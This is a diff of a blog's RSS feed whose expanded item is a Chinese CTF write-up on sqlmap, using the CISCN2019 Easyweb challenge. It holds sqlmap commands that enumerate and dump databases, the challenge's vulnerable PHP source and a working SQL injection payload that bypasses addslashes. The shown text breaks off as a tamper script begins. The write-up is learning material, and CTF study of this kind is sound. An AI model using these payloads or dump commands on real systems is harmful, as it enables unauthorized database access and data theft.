@@ -1,33 +1,580 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>其他 on 茄子的养殖场</title>
-    <link>https://proben1.github.io/tags/%E5%85%B6%E4%BB%96/</link>
-    <description>Recent content in 其他 on 茄子的养殖场</description>
-    <generator>Hugo</generator>
-    <language>en-us</language>
-    <lastBuildDate>Tue, 03 May 2022 21:08:57 +0800</lastBuildDate>
-    <atom:link href="https://proben1.github.io/tags/%E5%85%B6%E4%BB%96/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>sqlmap使用实例</title>
-      <link>https://proben1.github.io/2022/sqlmap%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B/</link>
-      <pubDate>Tue, 03 May 2022 21:08:57 +0800</pubDate>
-      <guid>https://proben1.github.io/2022/sqlmap%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B/</guid>
-      <description>学安全的时候第一件事就是在学长要求下安了sqlmap，可到现在还是只会这个： sqlmap -u &amp;#34;url&amp;#34; sqlmap -u &amp;#34;url&amp;#34; --dbs sqlmap -u &amp;#34;url&amp;#34; -D xx --tables sqlmap -u &amp;#34;url&amp;#34; -D xx -T xx --columns sqlmap -u &amp;#34;url&amp;#34; -D xx -T xx -C xx,xx --dump 或</description>
-    </item>
-    <item>
-      <title>绕过禁用F12</title>
-      <link>https://proben1.github.io/2021/%E7%BB%95%E8%BF%87%E7%A6%81%E7%94%A8f12/</link>
-      <pubDate>Sun, 05 Dec 2021 00:00:19 +0800</pubDate>
-      <guid>https://proben1.github.io/2021/%E7%BB%95%E8%BF%87%E7%A6%81%E7%94%A8f12/</guid>
-      <description>今天做题的时候，遇到了这个，一按F12，就弹出hacker 以前还真没遇见过，搜了一下，原来是js &amp;lt;!DOCTYPE html PUBLIC &amp;#34;-//W3C//DTD XHTML 1.0 Transitional//EN&amp;#34; &amp;#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&amp;#34;&amp;gt; &amp;lt;html xmlns=&amp;#34;http://www.w3.org/1999/xhtml&amp;#34;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta http-equiv=&amp;#34;Content-Type&amp;#34; content=&amp;#34;text/html; charset=utf-8&amp;#34; /&amp;gt; &amp;lt;title&amp;gt;&amp;lt;/title&amp;gt; &amp;lt;style type=&amp;#34;text/css&amp;#34;&amp;gt; /*禁</description>
-    </item>
-    <item>
-      <title>怎么ping不了</title>
-      <link>https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/</link>
-      <pubDate>Thu, 11 Nov 2021 03:32:29 +0800</pubDate>
-      <guid>https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/</guid>
-      <description>前言 关于为什么要取一个这么沙雕的名字是有原因的，是因为一个冬至的晚上我想用hexo d来把更新的博客上传到github pages上去，然而很不</description>
-    </item>
-  </channel>
+    <channel>
+        <title>其他 on 茄子的养殖场</title>
+        <link>https://proben1.github.io/tags/%E5%85%B6%E4%BB%96/</link>
+        <description>Recent content in 其他 on 茄子的养殖场</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Tue, 03 May 2022 21:08:57 +0800</lastBuildDate><atom:link href="https://proben1.github.io/tags/%E5%85%B6%E4%BB%96/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>sqlmap使用实例</title>
+        <link>https://proben1.github.io/2022/sqlmap%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B/</link>
+        <pubDate>Tue, 03 May 2022 21:08:57 +0800</pubDate>
+        
+        <guid>https://proben1.github.io/2022/sqlmap%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B/</guid>
+        <description>&lt;p&gt;学安全的时候第一件事就是在学长要求下安了sqlmap，可到现在还是只会这个：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u &amp;#34;url&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u &amp;#34;url&amp;#34; --dbs
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u &amp;#34;url&amp;#34; -D xx --tables 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u &amp;#34;url&amp;#34; -D xx -T xx --columns
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u &amp;#34;url&amp;#34; -D xx -T xx -C xx,xx --dump
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;或者一个post，把包抓下来，用：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -r post.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;今天就用一道题来演示一下，sqlmap的其他功能：&lt;/p&gt;
+&lt;p&gt;题目是：[CISCN2019 总决赛 Day2 Web1]Easyweb&lt;/p&gt;
+&lt;p&gt;源码：https://github.com/glzjin/CISCN_2019_Final_12_Day2_Web1&lt;/p&gt;
+&lt;p&gt;或者直接buu搜……&lt;/p&gt;
+&lt;p&gt;首先来审下题，robots.txt泄露出存在*.php.bak，再挨个php试一下，可以下载到image.php.bak，下面是审计部分，和sqlmap没关系，可以直接跳到结果部分&lt;/p&gt;
+&lt;p&gt;源码如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;include&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;config.php&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;isset(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;])&lt;span style=&#34;color:#ff79c6&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;isset(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;])&lt;span style=&#34;color:#ff79c6&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;addslashes(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;addslashes(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;str_replace(&lt;span style=&#34;color:#ff79c6&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;0&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;%00&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;),&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;str_replace(&lt;span style=&#34;color:#ff79c6&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;0&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;%00&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;),&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$result&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;mysqli_query(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$con&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;select * from images where id=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39; or path=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$row&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;mysqli_fetch_array(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$result&lt;/span&gt;,MYSQLI_ASSOC);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;./&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$row&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;header(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Content-Type: image/jpeg&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;readfile(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们发现addslashes()和str_replace()一起使用引起了安全隐患，当我们id输入为\0时，测试如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;isset(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;])&lt;span style=&#34;color:#ff79c6&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;isset(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;])&lt;span style=&#34;color:#ff79c6&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;输入：id&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;\0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;addslashes(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;addslashes(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;输出：\\0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;str_replace(&lt;span style=&#34;color:#ff79c6&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;0&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;%00&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;),&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;str_replace(&lt;span style=&#34;color:#ff79c6&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;0&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;%00&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;),&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;输出：\
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$result&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;select * from images where id=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39; or path=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;./&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$row&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$result&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;输出：select &lt;span style=&#34;color:#ff79c6&#34;&gt;*&lt;/span&gt; from images where id&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;\&amp;#39; or path=&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;#&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以发现最终的形式是这样的：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;select * from images where id=&amp;#39;xxx&amp;#39; or 1#&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得出结果：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;id=\0&amp;amp;path= or 1=1 %23
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;更改or后面的值可以更改payload。由于网页正确时会返回图片，我们使用布尔盲注或者时间盲注都可以。&lt;/p&gt;
+&lt;p&gt;下面演示一下使用sqlmap该怎么对这道题进行时间盲注：&lt;/p&gt;
+&lt;p&gt;首先是tamper脚本的编写：&lt;/p&gt;
+&lt;p&gt;在sqlmap/tamper/里新建自己中意名字的python脚本：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; sys
